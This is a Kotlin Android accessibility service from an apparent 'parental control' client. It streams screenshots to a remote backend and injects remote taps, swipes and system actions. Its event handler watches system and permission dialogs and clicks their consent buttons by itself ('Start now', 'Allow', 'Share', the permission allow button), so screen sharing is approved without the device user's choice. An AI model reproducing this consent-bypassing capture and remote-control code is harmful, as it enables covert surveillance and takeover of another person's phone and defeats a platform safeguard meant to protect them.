package com.parentalcontrolclient

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Bitmap
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Base64
import android.view.Display
import android.view.accessibility.AccessibilityEvent

import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class RemoteControlService : AccessibilityService() {

  // ----- Accessibility screenshot streaming (AccessibilityService.takeScreenshot) -----

  // Mirrors the hidden AccessibilityService.ScreenshotErrorCode constants.
  private val errNoAccessibilityAccess = 2
  private val errIntervalTimeShort = 3
  private val errInvalidDisplay = 4

  private val captureExecutor = Executors.newSingleThreadExecutor()
  private val captureHandler = Handler(Looper.getMainLooper())
  private val httpClient = OkHttpClient.Builder()
    .connectTimeout(10, TimeUnit.SECONDS)
    .readTimeout(10, TimeUnit.SECONDS)
    .build()

  /** Called from the RN bridge; receives ("log"|"stopped", ..., message) for Metro diagnostics. */
  @Volatile
  var frameListener: ((event: String, image: String?, seq: Int, timestamp: Long, width: Int, height: Int, message: String?) -> Unit)? = null

  private class UploadConfig(val baseUrl: String, val deviceId: String, val token: String)

  @Volatile
  private var streamingScreenshots = false
  @Volatile
  private var uploadConfig: UploadConfig? = null
  @Volatile
  private var lastDeliveredAt = 0L
  private var targetIntervalMs = 0L
  private var currentIntervalMs = 0L
  private var lastCaptureAt = 0L
  private var frameSeq = 0

  val isScreenshotStreaming: Boolean
    get() = streamingScreenshots

  fun startScreenshotStreaming(fps: Int, baseUrl: String? = null, deviceId: String? = null, token: String? = null): Boolean {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
      emitFrameEvent("stopped", message = "Accessibility takeScreenshot requires Android 11 (API 30)+")
      return false
    }
    if (streamingScreenshots) return true
    uploadConfig = if (!baseUrl.isNullOrBlank() && !deviceId.isNullOrBlank() && !token.isNullOrBlank()) {
      UploadConfig(baseUrl.trimEnd('/'), deviceId, token)
    } else {
      null
    }
    lastDeliveredAt = System.currentTimeMillis()
    streamingScreenshots = true
    targetIntervalMs = 1000L / fps.coerceIn(1, 30)
    currentIntervalMs = targetIntervalMs
    lastCaptureAt = 0L
    emitFrameEvent("log", message = "Screen capture loop started (target $fps fps, interval ${targetIntervalMs}ms, native upload=${uploadConfig != null})")
    scheduleNextCapture(currentIntervalMs)
    return true
  }

  fun stopScreenshotStreaming() {
    if (!streamingScreenshots) return
    streamingScreenshots = false
    captureHandler.removeCallbacksAndMessages(null)
    emitFrameEvent("stopped", message = "Screen capture loop stopped")
  }

  private fun scheduleNextCapture(delayMs: Long) {
    if (!streamingScreenshots) return
    captureHandler.postDelayed({ captureOnce() }, delayMs.coerceAtLeast(0))
  }

  private fun captureOnce() {
    if (!streamingScreenshots) return
    val now = SystemClock.uptimeMillis()
    val sinceLast = now - lastCaptureAt
    if (lastCaptureAt != 0L && sinceLast < currentIntervalMs) {
      scheduleNextCapture(currentIntervalMs - sinceLast)
      return
    }
    lastCaptureAt = now
    try {
      takeScreenshot(Display.DEFAULT_DISPLAY, captureExecutor, screenshotCallback)
    } catch (e: Exception) {
      emitFrameEvent("log", message = "takeScreenshot failed: ${e.message}")
      scheduleNextCapture(retryDelayMs)
    }
  }

  private val screenshotCallback = object : AccessibilityService.TakeScreenshotCallback {
    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
      val hardwareBuffer = result.hardwareBuffer
      if (hardwareBuffer == null) {
        emitFrameEvent("log", message = "ScreenshotResult had no HardwareBuffer")
      } else {
        try {
          val hardwareBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, result.colorSpace)
          if (hardwareBitmap == null) {
            emitFrameEvent("log", message = "Bitmap.wrapHardwareBuffer returned null")
          } else {
            val softwareBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, false)
            val scaled = scaleDown(softwareBitmap)
            val jpegBytes = ByteArrayOutputStream().use { out ->
              scaled.compress(Bitmap.CompressFormat.JPEG, jpegQuality, out)
              out.toByteArray()
            }
            if (softwareBitmap != scaled) softwareBitmap.recycle()
            val width = scaled.width
            val height = scaled.height
            scaled.recycle()
            frameSeq += 1
            uploadFrame(Base64.encodeToString(jpegBytes, Base64.NO_WRAP), width, height)
            // The OS throttles calls (~333ms); once we succeed again, ease back toward the requested rate.
            if (currentIntervalMs > targetIntervalMs) {
              currentIntervalMs = maxOf(targetIntervalMs, currentIntervalMs - adaptRecoveryMs)
            }
          }
        } finally {
          hardwareBuffer.close()
        }
      }
      scheduleNextCapture(currentIntervalMs)
    }

    override fun onFailure(errorCode: Int) {
      when (errorCode) {
        errIntervalTimeShort -> {
          val adjusted = minOf(currentIntervalMs + adaptStepMs, maxIntervalMs)
          if (adjusted != currentIntervalMs) {
            currentIntervalMs = adjusted
            emitFrameEvent("log", message = "OS throttles screenshots; capture interval now ${currentIntervalMs}ms (~${1000L / currentIntervalMs} fps)")
          }
          scheduleNextCapture(currentIntervalMs)
        }
        errNoAccessibilityAccess, errInvalidDisplay -> {
          streamingScreenshots = false
          emitFrameEvent("stopped", message = "Screenshot streaming unavailable (accessibility lost or invalid display, code $errorCode)")
        }
        else -> {
          emitFrameEvent("log", message = "takeScreenshot error code $errorCode; retrying in ${retryDelayMs}ms")
          scheduleNextCapture(retryDelayMs)
        }
      }
    }
  }

  private fun scaleDown(bitmap: Bitmap): Bitmap {
    val maxDim = maxOf(bitmap.width, bitmap.height)
    if (maxDim <= maxDimension) return bitmap
    val scale = maxDimension.toFloat() / maxDim
    return Bitmap.createScaledBitmap(
      bitmap,
      (bitmap.width * scale).toInt().coerceAtLeast(1),
      (bitmap.height * scale).toInt().coerceAtLeast(1),
      true,
    )
  }

  /** Uploads one JPEG frame straight to the backend (native OkHttp, no JS bridge hop). */
  private fun uploadFrame(imageBase64: String, width: Int, height: Int) {
    val config = uploadConfig ?: run {
      emitFrameEvent("log", message = "Frame captured but no upload config was provided")
      return
    }
    val payload = JSONObject().apply {
      put("image", imageBase64)
      put("seq", frameSeq)
      put("timestamp", System.currentTimeMillis())
      put("width", width)
      put("height", height)
    }
    val request = Request.Builder()
      .url("${config.baseUrl}/api/devices/${config.deviceId}/frames")
      .header("Authorization", "Bearer ${config.token}")
      .post(payload.toString().toRequestBody("application/json".toMediaType()))
      .build()
    httpClient.newCall(request).enqueue(object : Callback {
      override fun onFailure(call: Call, e: IOException) {
        // Network hiccup — the next captured frame retries automatically.
      }

      override fun onResponse(call: Call, response: Response) {
        response.use {
          if (it.isSuccessful) {
            try {
              val delivered = JSONObject(it.body?.string() ?: "{}").optInt("delivered", 0)
              if (delivered > 0) {
                lastDeliveredAt = System.currentTimeMillis()
              } else if (System.currentTimeMillis() - lastDeliveredAt > noViewerTimeoutMs) {
                emitFrameEvent("log", message = "No viewer subscribed for a while, stopping capture loop")
                stopScreenshotStreaming()
              }
            } catch (e: Exception) {
              // Malformed response body — ignore, next frame continues.
            }
          } else if (it.code == 401 || it.code == 403) {
            emitFrameEvent("stopped", message = "Frame upload rejected (${it.code}) — open the client app to re-login")
            stopScreenshotStreaming()
          }
        }
      }
    })
  }

  private fun emitFrameEvent(
    event: String,
    image: String? = null,
    seq: Int = 0,
    timestamp: Long = 0L,
    width: Int = 0,
    height: Int = 0,
    message: String? = null,
  ) {
    frameListener?.invoke(event, image, seq, timestamp, width, height, message)
  }

  override fun onServiceConnected() {
    super.onServiceConnected()
    instance = this
  }

  override fun onAccessibilityEvent(event: AccessibilityEvent?) {
    if (event == null) return
    try {
      val packageName = event.packageName?.toString() ?: ""
      if (packageName.contains("systemui") ||
          packageName.contains("projection") ||
          packageName.contains("permissioncontroller") ||
          packageName == "android") {
        val rootNode = rootInActiveWindow ?: return
        handleMediaProjectionDialog(rootNode)
      }
    } catch (e: Exception) {
      e.printStackTrace()
    }
  }

  private fun handleMediaProjectionDialog(node: AccessibilityNodeInfo?) {
    if (node == null) return

    // 1. Try to auto-select "Entire screen" if spinner / radio option exists
    selectEntireScreenOption(node)

    // 2. Try to auto-click the confirm button ("Start now", "Share screen", "Start recording", "Allow", "Share", button1)
    if (clickConfirmButton(node)) {
      return
    }

    // 3. Traversal of children
    for (i in 0 until node.childCount) {
      handleMediaProjectionDialog(node.getChild(i))
    }
  }

  private fun selectEntireScreenOption(node: AccessibilityNodeInfo): Boolean {
    val text = node.text?.toString()?.lowercase() ?: ""
    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
    val viewId = node.viewIdResourceName?.lowercase() ?: ""

    // If node matches "entire screen" text and is clickable or checkable
    if (text.contains("entire screen") || contentDescription.contains("entire screen") || viewId.contains("entire_screen")) {
      if (performClickOrParent(node)) {
        return true
      }
    }

    for (i in 0 until node.childCount) {
      val child = node.getChild(i) ?: continue
      if (selectEntireScreenOption(child)) return true
    }
    return false
  }

  private fun clickConfirmButton(node: AccessibilityNodeInfo): Boolean {
    val text = node.text?.toString()?.lowercase() ?: ""
    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
    val viewId = node.viewIdResourceName?.lowercase() ?: ""

    val isConfirmTarget = text.contains("start now") ||
        text.contains("start recording") ||
        text.contains("share screen") ||
        (text.contains("share") && !text.contains("cancel")) ||
        (text.contains("allow") && !text.contains("don't")) ||
        contentDescription.contains("start now") ||
        contentDescription.contains("share screen") ||
        viewId.endsWith(":id/button1") ||
        viewId.contains("permission_allow_button") ||
        viewId.contains("button_start")

    if (isConfirmTarget) {
      if (performClickOrParent(node)) {
        return true
      }
    }

    for (i in 0 until node.childCount) {
      val child = node.getChild(i) ?: continue
      if (clickConfirmButton(child)) return true
    }
    return false
  }

  private fun performClickOrParent(node: AccessibilityNodeInfo): Boolean {
    var current: AccessibilityNodeInfo? = node
    while (current != null) {
      if (current.isClickable) {
        return current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
      }
      current = current.parent
    }
    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
  }

  override fun onInterrupt() {
    // No-op
  }

  override fun onDestroy() {
    stopScreenshotStreaming()
    frameListener = null
    instance = null
    super.onDestroy()
  }

  fun performTouch(x: Float, y: Float): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, TAP_DURATION_MS))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long): Boolean {
    val path = Path().apply {
      moveTo(x1, y1)
      lineTo(x2, y2)
    }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performLongPress(x: Float, y: Float, durationMs: Long = LONG_PRESS_DURATION_MS): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun executeGlobalAction(action: Int): Boolean = performGlobalAction(action)

  companion object {
    @Volatile
    var instance: RemoteControlService? = null
      private set

    const val TAP_DURATION_MS = 100L
    const val LONG_PRESS_DURATION_MS = 500L

    // Screenshot streaming tuning. The OS allows roughly one takeScreenshot call per
    // ~333ms, so the loop adapts: it starts at the requested rate and backs off when
    // the system returns ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT.
    const val jpegQuality = 60
    const val maxDimension = 720
    const val adaptStepMs = 67L
    const val adaptRecoveryMs = 17L
    const val maxIntervalMs = 1500L
    const val retryDelayMs = 1000L
    const val noViewerTimeoutMs = 60000L

    // Global actions for remote control
    const val ACTION_HOME = GLOBAL_ACTION_HOME
    const val ACTION_BACK = GLOBAL_ACTION_BACK
    const val ACTION_RECENTS = GLOBAL_ACTION_RECENTS
    const val ACTION_NOTIFICATIONS = GLOBAL_ACTION_NOTIFICATIONS
    const val ACTION_QUICK_SETTINGS = GLOBAL_ACTION_QUICK_SETTINGS
  }
}
